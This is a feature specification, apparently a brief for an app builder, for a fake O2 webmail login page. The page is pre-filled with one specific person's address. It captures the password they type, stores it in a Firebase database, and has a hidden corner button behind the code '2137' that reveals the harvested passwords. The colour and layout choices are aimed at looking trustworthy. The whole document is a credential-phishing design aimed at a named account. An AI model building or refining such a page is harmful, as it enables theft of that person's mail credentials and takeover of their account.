# **App Name**: O2 Mail Confirm

## Core Features:

- O2 Login Mimicry: Present a user interface designed to convincingly resemble the O2 mail login page, pre-filled with the username 'sabatinka@o2.pl'.
- Password Input Capture: Capture the password entered by the user into the mimicked login form.
- Firebase Password Storage: Securely transmit and store the captured password(s) within a Firebase database.
- Hidden Admin Trigger: Implement a discreet and inconspicuous UI element, such as a small button or invisible click area, in a corner of the page.
- Secret Code Verification: Upon activating the hidden trigger, a prompt will appear, requiring the user to enter the secret numerical code '2137'.
- Display Stored Passwords: If the code '2137' is entered correctly, all passwords previously stored in the Firebase database will be retrieved and displayed within the interface.

## Style Guidelines:

- The overall scheme will be light, reflecting the professional and clean aesthetic of a mail service. The primary interactive color will be a balanced, trustworthy blue (#4D95E0), chosen for its association with official communication and reliability.
- The background color will be a very subtle, desaturated tint of the primary blue (#E6EDF3), providing a calm and unobtrusive canvas that ensures content readability.
- An analogous accent color, a lively teal (#5DDEDC), will be used sparingly for key interactive elements and to draw attention without clashing with the primary blue.
- Body and headline font: 'Inter' (sans-serif) for its modern, highly legible, and objective aesthetic, ideal for a clear and functional interface.
- Use minimalist and universally recognizable icons, consistent with a professional webmail interface, prioritizing clarity and direct communication over ornate designs.
- Employ a clean, centered layout for the login form, typical of official sign-in pages, to ensure focus on the required input fields and maintain a sense of trustworthiness.
